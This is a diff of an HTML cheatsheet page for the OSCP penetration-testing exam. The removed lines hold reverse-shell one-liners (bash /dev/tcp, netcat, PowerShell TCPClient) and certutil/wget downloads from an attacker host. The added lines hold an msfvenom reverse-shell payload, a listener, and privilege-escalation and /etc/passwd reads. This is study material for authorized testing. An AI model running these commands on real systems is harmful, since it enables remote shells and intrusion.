@@ -1,114 +1,122 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>OSCP Command Helper</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>OSCP Cheatsheet - Quick Commands</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #1e1e1e;
-      color: #f0f0f0;
+      background: #121212;
+      color: #eee;
+      margin: 0;
       padding: 20px;
     }
-    h1 {
+    h1, h2 {
       text-align: center;
-      color: #4caf50;
     }
-    select, button, input {
-      margin: 5px;
-      padding: 8px;
+    .category {
+      margin: 30px 0;
     }
-    .command-box {
-      background: #2e2e2e;
-      padding: 10px;
+    .command {
+      background: #1e1e1e;
+      padding: 15px;
       margin: 10px 0;
-      border-left: 4px solid #4caf50;
+      border-radius: 8px;
       position: relative;
+    }
+    .command pre {
+      margin: 0;
+      overflow-x: auto;
     }
     .copy-btn {
       position: absolute;
       top: 10px;
       right: 10px;
-      background-color: #4caf50;
-      color: white;
+      background: #444;
       border: none;
-      padding: 4px 8px;
+      color: #eee;
+      padding: 5px 10px;
+      border-radius: 4px;
       cursor: pointer;
+    }
+    .copy-btn:hover {
+      background: #666;
+    }
+    @media (max-width: 600px) {
+      .command {
+        font-size: 14px;
+      }
     }
   </style>
 </head>
 <body>
+  <h1>OSCP Exam Cheatsheet</h1>
+  <p style="text-align:center;">Quick access to common OSCP commands & payloads</p>
 
-<h1>OSCP Command Helper</h1>
+  <div class="category">
+    <h2>📌 Enumeration</h2>
+    <div class="command">
+      <button class="copy-btn">Copy</button>
+      <pre>nmap -sC -sV -oA fullscan &lt;IP&gt;</pre>
+    </div>
+    <div class="command">
+      <button class="copy-btn">Copy</button>
+      <pre>ffuf -u http://&lt;IP&gt;/FUZZ -w /usr/share/wordlists/dirb/common.txt -ic</pre>
+    </div>
+  </div>
 
-<label for="category">Choose Category:</label>
-<select id="category" onchange="loadCommands()">
-  <option value="enum">Enumeration</option>
-  <option value="privesc">Privilege Escalation</option>
-  <option value="rev">Reverse Shells</option>
-  <option value="file">File Transfer</option>
-</select>
+  <div class="category">
+    <h2>🔑 Exploitation</h2>
+    <div class="command">
+      <button class="copy-btn">Copy</button>
+      <pre>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f exe > shell.exe</pre>
+    </div>
+    <div class="command">
+      <button class="copy-btn">Copy</button>
+      <pre>nc -lvnp 4444</pre>
+    </div>
+  </div>
 
-<input type="text" id="ip" placeholder="Attacker IP (e.g. 10.10.14.1)">
-<input type="text" id="port" placeholder="Port (e.g. 4444)">
+  <div class="category">
+    <h2>🚀 Privilege Escalation</h2>
+    <div class="command">
+      <button class="copy-btn">Copy</button>
+      <pre>find / -perm -4000 2>/dev/null</pre>
+    </div>
+    <div class="command">
+      <button class="copy-btn">Copy</button>
+      <pre>sudo -l</pre>
+    </div>
+    <div class="command">
+      <button class="copy-btn">Copy</button>
+      <pre>uname -a && id && whoami</pre>
+    </div>
+  </div>
 
-<div id="commands"></div>
+  <div class="category">
+    <h2>📄 Post Exploitation</h2>
+    <div class="command">
+      <button class="copy-btn">Copy</button>
+      <pre>cat /etc/passwd</pre>
+    </div>
+    <div class="command">
+      <button class="copy-btn">Copy</button>
+      <pre>wmic useraccount get name,sid</pre>
+    </div>
+  </div>
 
-<script>
-  const commands = {
-    enum: [
-      { os: "Linux", cmd: "uname -a" },
-      { os: "Linux", cmd: "id; whoami; hostname" },
-      { os: "Windows", cmd: "systeminfo" },
-      { os: "Windows", cmd: "net user" }
-    ],
-    privesc: [
-      { os: "Linux", cmd: "find / -perm -u=s -type f 2>/dev/null" },
-      { os: "Linux", cmd: "sudo -l" },
-      { os: "Windows", cmd: "whoami /priv" },
-      { os: "Windows", cmd: "wmic qfe get Caption,Description,HotFixID,InstalledOn" }
-    ],
-    rev: [
-      { os: "Linux", cmd: "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1" },
-      { os: "Linux", cmd: "nc -e /bin/bash {IP} {PORT}" },
-      { os: "Windows", cmd: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"" }
-    ],
-    file: [
-      { os: "Linux", cmd: "python3 -m http.server 8000" },
-      { os: "Linux", cmd: "scp file.txt user@{IP}:/tmp/" },
-      { os: "Windows", cmd: "certutil -urlcache -split -f http://{IP}:{PORT}/file.exe file.exe" },
-      { os: "Linux", cmd: "wget http://{IP}:{PORT}/file.sh -O /tmp/file.sh" }
-    ]
-  };
-
-  function loadCommands() {
-    const cat = document.getElementById("category").value;
-    const ip = document.getElementById("ip").value || "{IP}";
-    const port = document.getElementById("port").value || "{PORT}";
-    const cmdDiv = document.getElementById("commands");
-    cmdDiv.innerHTML = "";
-
-    commands[cat].forEach(c => {
-      let replaced = c.cmd.replaceAll("{IP}", ip).replaceAll("{PORT}", port);
-      let html = `
-        <div class="command-box">
-          <strong>${c.os}:</strong>
-          <pre>${replaced}</pre>
-          <button class="copy-btn" onclick="copyToClipboard(\`${replaced}\`)">Copy</button>
-        </div>
-      `;
-      cmdDiv.innerHTML += html;
+  <script>
+    // Copy to clipboard functionality
+    document.querySelectorAll('.copy-btn').forEach(button => {
+      button.addEventListener('click', () => {
+        const command = button.nextElementSibling.innerText;
+        navigator.clipboard.writeText(command).then(() => {
+          button.innerText = "Copied!";
+          setTimeout(() => button.innerText = "Copy", 2000);
+        });
+      });
     });
-  }
-
-  function copyToClipboard(text) {
-    navigator.clipboard.writeText(text).then(() => {
-      alert("Copied to clipboard!");
-    });
-  }
-
-  window.onload = loadCommands;
-</script>
-
+  </script>
 </body>
 </html>
